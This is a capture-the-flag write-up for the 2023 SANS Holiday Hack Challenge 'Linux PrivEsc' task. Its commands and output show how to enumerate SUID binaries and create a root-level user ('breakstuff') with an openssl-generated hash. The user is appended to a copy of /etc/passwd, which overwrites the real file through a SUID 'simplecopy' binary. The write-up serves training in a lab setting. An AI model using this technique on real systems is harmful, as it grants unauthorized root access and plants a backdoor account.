# Writeup for The 2023 SANS Holiday Hack Challenge: A Holiday Odyssey \| Featuring 6: Geese A-Lei'ing!
## Linux PrivEsc
Difficulty: :christmas_tree::christmas_tree::christmas_tree:    
Rosemold is in Ostrich Saloon on the Island of Misfit Toys. Give her a hand with escalation for a tip about hidden islands.

### Hints
#### Linux Privilege Escalation Techniques
*From: Rose Mold*
There's [various ways](https://payatu.com/blog/a-guide-to-linux-privilege-escalation/) to escalate privileges on a Linux system.
#### Linux Command Injection
*From: Rose Mold*
Use the privileged binary to overwriting a file to escalate privileges could be a solution, but there's an easier method if you pass it a crafty argument.

### Solution
Knowing that the challenge is related to Linux Privilege Escalation, a common reconnaissance step is to list SUID executables, which in this case highlights an uncommon one called simplecopy:
```bash
elf@72cacccd1fe6:~$ find / -type f -perm -04000 -ls 2>/dev/null
  1312417     84 -rwsr-xr-x   1 root     root        85064 Nov 29  2022 /usr/bin/chfn
  1312423     52 -rwsr-xr-x   1 root     root        53040 Nov 29  2022 /usr/bin/chsh
  1312541     56 -rwsr-xr-x   1 root     root        55528 May 30  2023 /usr/bin/mount
  1312546     44 -rwsr-xr-x   1 root     root        44784 Nov 29  2022 /usr/bin/newgrp
  1312620     68 -rwsr-xr-x   1 root     root        67816 May 30  2023 /usr/bin/su
  1312484     88 -rwsr-xr-x   1 root     root        88464 Nov 29  2022 /usr/bin/gpasswd
  1312645     40 -rwsr-xr-x   1 root     root        39144 May 30  2023 /usr/bin/umount
  1312557     68 -rwsr-xr-x   1 root     root        68208 Nov 29  2022 /usr/bin/passwd
  1457015     20 -rwsr-xr-x   1 root     root        16952 Dec  2 22:17 /usr/bin/simplecopy
```
The `simplecopy` executable looks like a standard `cp` command, but eventually allowing to overwrite root-owned files. One escalation path would be to overwrite `/etc/passwd`, adding a user with root privileges for which the attacker knows all credentials. First thing is to generate the passwd content:
```bash
thedead@dellian:~/hhc2023/Linux PrivEsc$ openssl passwd -1 -salt kringle con2023
$1$kringle$M.uL5k/EEbyamRF6aMNJz/
```
Then add the new user `breakstuff` it to the `/etc/passwd` file:
```bash
elf@72cacccd1fe6:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
# Output removed to shorten report
elf:x:1000:1000::/home/elf:/bin/sh
elf@72cacccd1fe6:~$ cp /etc/passwd passwd_tamper
elf@72cacccd1fe6:~$ echo 'breakstuff:$1$kringle$M.uL5k/EEbyamRF6aMNJz/:0:0:root:/root:/bin/bash' >> passwd_tamper
elf@72cacccd1fe6:~$ /usr/bin/simplecopy passwd_tamper /etc/passwd
```
Lastly login as `breakstuff` to gain root privileges and... `runmetoanswer`!
```bash
elf@72cacccd1fe6:~$ su breakstuff
Password:
root@72cacccd1fe6:/home/elf# cd
root@72cacccd1fe6:~# ls
runmetoanswer
root@b5bd66274d00:~# ./runmetoanswer
Who delivers Christmas presents?

> santa
Your answer: santa

Checking....
Your answer is correct!
```